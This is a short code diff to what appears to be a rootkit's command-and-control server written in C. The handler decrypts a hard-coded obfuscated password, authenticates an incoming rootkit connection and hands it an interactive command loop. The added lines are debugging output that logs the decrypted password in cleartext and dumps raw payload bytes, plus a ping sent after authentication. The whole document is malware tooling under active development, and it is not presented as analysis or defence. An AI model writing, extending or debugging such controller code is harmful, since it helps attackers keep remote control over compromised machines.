@@ -173,6 +173,9 @@ static void handle_client(client_t *c)
 
     /* Authenticate the rootkit */
     const char *real_pass = decrypt_caesar(WLKOM_PASSWORD);
+    log_event("DEBUG: sending password='%s' len=%zu\n",
+              real_pass, strlen(real_pass));
+
     if (send_packet(c->fd, CMD_AUTH,
                     real_pass,
                     strlen(real_pass)) < 0) {
@@ -190,6 +193,18 @@ static void handle_client(client_t *c)
         goto disconnect;
     }
 
+    log_event("DEBUG: opcode=0x%02x payload_len=%u payload='%s'\n",
+              opcode, payload_len, payload ? payload : "null");
+
+    /* Affiche les bytes bruts */
+    if (payload) {
+        printf("DEBUG raw bytes: ");
+        for (uint32_t i = 0; i < payload_len; i++)
+            printf("%02x ", (unsigned char)payload[i]);
+        printf("\n");
+        fflush(stdout);
+    }
+
     if (opcode != CMD_AUTH || !payload ||
         strncmp(payload, "OK", 2) != 0) {
         log_event("❌ Auth failed: %s\n", payload ? payload : "null");
@@ -202,6 +217,8 @@ static void handle_client(client_t *c)
     c->authed = true;
     log_event("✅ Rootkit authenticated from %s:%d\n",
               c->remote_ip, c->remote_port);
+    
+    send_packet(c->fd, CMD_PING, NULL, 0);
 
     /* Interactive command loop */
     commands_loop(c);
